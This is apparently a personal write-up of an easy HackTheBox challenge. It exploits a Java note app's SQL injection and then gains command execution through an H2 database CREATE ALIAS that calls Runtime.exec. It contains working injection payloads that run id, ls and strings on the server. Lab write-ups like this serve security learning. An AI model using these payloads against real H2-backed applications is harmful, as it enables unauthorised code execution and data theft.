---
title: Pentest Notes
tags:
  - HackTheBox
  - Challenge
  - Easy
  - SQLi
  - H2_Database
  - Command-Injection
---
![](Pasted%20image%2020241115171026.png)

I found the creds `user:123` in the source code. Analyzing the code I discovered a basic SQLi vulnerability:

```java
String query = String.format("Select * from notes where name ='%s' ", name);
```

If we put: `hello' OR 1=0 -- -` we've got it. I dumped all the tables, but didn't found anything, so I managed that might be something harder. Inspecting he source further I found that an H2 Java SQL database was in use:

```shell
spring.application.name=PentestNotes
spring.datasource.url=jdbc:h2:mem:notedb
spring.datasource.driverClassName=org.h2.Driver
spring.jpa.database-platform=org.hibernate.dialect.H2Dialect
spring.jpa.defer-datasource-initialization=true
spring.http.encoding.charset=UTF-8
spring.mvc.view.charset=UTF-8
```

So I searched for "*H2 database command injection through sqli*", and found [this article](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
- I've created a note about it :D

Basically, if I capture the petition with burp and **Do intercept** the petition I can modify the POST parameter and inject there an ALIAS:

- First I create the alias:

```sql
SQL Injection' or 1=0; CREATE ALIAS FUCKED AS '  
String execve(String cmd) throws java.io.IOException {  
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");  
    return s.hasNext() ? s.next() : "";  
}';-- -
```

- Then I call it by inserting a command in the notes table (I spend two days to manage this out xd):

```shell
SQL Injection' OR 1=0; INSERT INTO notes (name, note) VALUES ('Command Output', FUCKED('id')); --
```

- Then I performed a UNION SQLi to check if the command output was written to the table:

```shell
SQL Injection' OR 1=0 UNION SELECT * from notes -- -
```

![](Pasted%20image%2020241115172002.png)

> *BINGO, BANGO, BONGO!* We got this!

So we can check the `/` directory for the flag (it name is random):

![](Pasted%20image%2020241115172115.png)

```shell
SQL Injection' OR 1=0; INSERT INTO notes (name, note) VALUES ('Command Output', FUCKED('ls /')); --
```

![](Pasted%20image%2020241115172158.png)

So in my case, the flag is called `JN8fe3XRqTYK_flag.txt`, so I cat it:

```shell
SQL Injection' OR 1=0; INSERT INTO notes (name, note) VALUES ('Command Output', FUCKED('strings /JN8fe3XRqTYK_flag.txt')); -- -
```

> And got the flag!

![](Pasted%20image%2020241115172319.png)

==Challenge completed!==
